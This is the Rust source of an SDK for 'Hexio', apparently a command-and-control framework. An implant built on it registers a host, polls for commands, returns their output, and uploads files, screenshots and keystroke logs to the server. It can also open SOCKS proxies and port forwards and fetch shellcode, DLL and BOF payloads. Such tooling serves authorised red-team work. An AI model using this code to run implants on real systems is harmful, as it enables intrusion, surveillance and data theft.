//! Hexio External Agent SDK for Rust.
//!
//! ```no_run
//! use hexio_sdk::{HexioClient, RegisterRequest};
//!
//! let mut client = HexioClient::new("http://10.0.0.1:9000", "my-passphrase");
//! let reg = client.register(RegisterRequest {
//!     hostname: "WORKSTATION".into(),
//!     ip: "10.0.0.50".into(),
//!     user: "admin".into(),
//!     os: "Windows 10".into(),
//!     process: "myagent.exe".into(),
//!     arch: "x64".into(),
//!     pid: 1234,
//!     client_type: "my_agent".into(),
//!     sleep_time: 5,
//! }).unwrap();
//! // client.token is now set
//!
//! loop {
//!     let checkin = client.checkin().unwrap();
//!     for cmd in checkin.commands {
//!         let output = format!("ran {}", cmd.command);
//!         client.command_response(cmd.id, &cmd.command, &output).unwrap();
//!     }
//!     std::thread::sleep(std::time::Duration::from_secs(5));
//! }
//! ```

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::time::Duration;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum HexioError {
    #[error("transport error: {0}")]
    Transport(#[from] Box<ureq::Error>),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("json error: {0}")]
    Json(#[from] serde_json::Error),
    #[error("api error ({status}): {message}")]
    Api { status: u16, message: String },
}

pub type Result<T> = std::result::Result<T, HexioError>;

pub struct HexioClient {
    pub base_url: String,
    pub passphrase: String,
    pub token: Option<String>,
    pub agent_id: Option<i64>,
    pub agent: ureq::Agent,
}

impl HexioClient {
    pub fn new(base_url: impl Into<String>, passphrase: impl Into<String>) -> Self {
        let agent = ureq::AgentBuilder::new()
            .timeout(Duration::from_secs(30))
            .build();
        Self {
            base_url: base_url.into().trim_end_matches('/').to_string(),
            passphrase: passphrase.into(),
            token: None,
            agent_id: None,
            agent,
        }
    }

    fn request(&self, method: &str, path: &str, body: Option<&Value>) -> Result<Value> {
        let url = format!("{}{}", self.base_url, path);
        let mut req = self
            .agent
            .request(method, &url)
            .set("HexioExternalAgentAuth", &self.passphrase);

        if let Some(ref tok) = self.token {
            req = req.set("HexioAgentToken", tok);
        }

        let result = match body {
            Some(b) => {
                req = req.set("Content-Type", "application/json");
                req.send_json(b.clone())
            }
            None => req.call(),
        };

        match result {
            Ok(resp) => {
                let text = resp.into_string()?;
                if text.is_empty() {
                    Ok(Value::Object(serde_json::Map::new()))
                } else {
                    Ok(serde_json::from_str(&text)?)
                }
            }
            Err(ureq::Error::Status(code, resp)) => {
                let body = resp.into_string().unwrap_or_default();
                let message = serde_json::from_str::<Value>(&body)
                    .ok()
                    .and_then(|v| v.get("error").and_then(|e| e.as_str()).map(String::from))
                    .unwrap_or(body);
                Err(HexioError::Api {
                    status: code,
                    message,
                })
            }
            Err(e) => Err(HexioError::Transport(Box::new(e))),
        }
    }

    pub fn register(&mut self, req: RegisterRequest) -> Result<RegisterResponse> {
        let body = serde_json::to_value(&req)?;
        let resp: RegisterResponse = serde_json::from_value(self.request("POST", "/register", Some(&body))?)?;
        self.token = Some(resp.token.clone());
        self.agent_id = Some(resp.agent_id);
        Ok(resp)
    }

    pub fn checkin(&self) -> Result<CheckinResponse> {
        Ok(serde_json::from_value(self.request("GET", "/agent/checkin", None)?)?)
    }

    pub fn sync(&self, sleep_time: Option<i64>, sleep_jitter: Option<i64>) -> Result<Value> {
        let body = if let Some(st) = sleep_time {
            let mut sleep = serde_json::Map::new();
            sleep.insert("sleep_time".into(), json!(st));
            if let Some(j) = sleep_jitter {
                sleep.insert("sleep_jitter".into(), json!(j));
            }
            Some(json!({ "sleep": sleep }))
        } else {
            None
        };
        self.request("POST", "/agent/sync", body.as_ref())
    }

    pub fn sync_raw(&self, body: &Value) -> Result<Value> {
        self.request("POST", "/agent/sync", Some(body))
    }

    pub fn command_response(&self, command_id: i64, command: &str, response: &str) -> Result<Value> {
        let body = json!({
            "command_id": command_id,
            "command": command,
            "response": response,
        });
        self.request("POST", "/agent/command/response", Some(&body))
    }

    pub fn download_init(&self, req: DownloadInitRequest) -> Result<DownloadInitResponse> {
        let body = serde_json::to_value(&req)?;
        Ok(serde_json::from_value(self.request("POST", "/agent/download/init", Some(&body))?)?)
    }

    pub fn download_chunk(&self, download_id: &str, chunk: &[u8]) -> Result<Value> {
        let body = json!({
            "download_id": download_id,
            "chunk_data": B64.encode(chunk),
        });
        self.request("POST", "/agent/download/chunk", Some(&body))
    }

    pub fn download_cancel(&self, download_id: &str) -> Result<Value> {
        let body = json!({ "download_id": download_id });
        self.request("POST", "/agent/download/cancel", Some(&body))
    }

    pub fn download_file(&self, file_path: &str, data: &[u8], chunk_size: usize) -> Result<String> {
        let file_name = file_path.rsplit(['/', '\\']).next().unwrap_or(file_path);
        let chunk_size = chunk_size.max(1);
        let total_chunks = (data.len() + chunk_size - 1) / chunk_size;
        let init = self.download_init(DownloadInitRequest {
            file_name: file_name.into(),
            agent_path: file_path.into(),
            file_size: data.len() as i64,
            chunk_size: chunk_size as i64,
            total_chunks: total_chunks as i64,
        })?;
        for i in 0..total_chunks {
            let start = i * chunk_size;
            let end = (start + chunk_size).min(data.len());
            self.download_chunk(&init.download_id, &data[start..end])?;
        }
        Ok(init.download_id)
    }

    pub fn screenshot(&self, filename: &str, image: &[u8]) -> Result<Value> {
        let body = json!({
            "filename": filename,
            "data": B64.encode(image),
        });
        self.request("POST", "/agent/screenshot", Some(&body))
    }

    pub fn keylog(&self, filename: &str, data: &str) -> Result<Value> {
        let body = json!({ "filename": filename, "data": data });
        self.request("POST", "/agent/keylog", Some(&body))
    }

    pub fn set_impersonation(&self, user: &str) -> Result<Value> {
        let body = json!({ "user": user });
        self.request("POST", "/agent/impersonation", Some(&body))
    }

    pub fn clear_impersonation(&self) -> Result<Value> {
        self.set_impersonation("")
    }

    pub fn sidechannel(&self, channel_id: &str, data_b64: &str) -> Result<Value> {
        let body = json!({ "channel_id": channel_id, "data": data_b64 });
        self.request("POST", "/agent/sidechannel", Some(&body))
    }

    pub fn request_files(&self, req: FileRequest) -> Result<Value> {
        let body = serde_json::to_value(&req)?;
        self.request("POST", "/agent/files/request", Some(&body))
    }

    pub fn socks_open(&self, port: Option<i64>) -> Result<Value> {
        let body = match port {
            Some(p) => json!({ "port": p }),
            None => json!({}),
        };
        self.request("POST", "/agent/socks/open", Some(&body))
    }

    pub fn socks_close(&self) -> Result<Value> {
        self.request("POST", "/agent/socks/close", Some(&json!({})))
    }

    pub fn socks_sync(&self, data: &Value) -> Result<Value> {
        self.request("POST", "/agent/socks/sync", Some(data))
    }

    pub fn portfwd_open(&self, port: i64, remote_host: &str, remote_port: i64) -> Result<Value> {
        let body = json!({
            "port": port,
            "remote_host": remote_host,
            "remote_port": remote_port,
        });
        self.request("POST", "/agent/portfwd/open", Some(&body))
    }

    pub fn portfwd_close(&self, port: i64) -> Result<Value> {
        let body = json!({ "port": port });
        self.request("POST", "/agent/portfwd/close", Some(&body))
    }

    pub fn portfwd_sync(&self, data: &Value) -> Result<Value> {
        self.request("POST", "/agent/portfwd/sync", Some(data))
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterRequest {
    pub hostname: String,
    pub ip: String,
    pub user: String,
    pub os: String,
    pub process: String,
    pub arch: String,
    pub pid: i64,
    pub client_type: String,
    #[serde(default)]
    pub sleep_time: i64,
}

#[derive(Debug, Clone, Deserialize)]
pub struct RegisterResponse {
    pub agent_id: i64,
    pub token: String,
}

#[derive(Debug, Clone, Deserialize)]
pub struct Command {
    pub id: i64,
    pub command: String,
}

#[derive(Debug, Clone, Deserialize)]
pub struct CheckinResponse {
    #[serde(default)]
    pub commands: Vec<Command>,
    #[serde(default)]
    pub files: Vec<Value>,
}

#[derive(Debug, Clone, Serialize)]
pub struct DownloadInitRequest {
    pub file_name: String,
    pub agent_path: String,
    pub file_size: i64,
    pub chunk_size: i64,
    pub total_chunks: i64,
}

#[derive(Debug, Clone, Deserialize)]
pub struct DownloadInitResponse {
    pub download_id: String,
    pub agent_path: String,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct FileRequest {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub bof_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub pe_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub dll_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub elf_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub macho_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub shellcode_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub hexlang: Option<Vec<String>>,
}
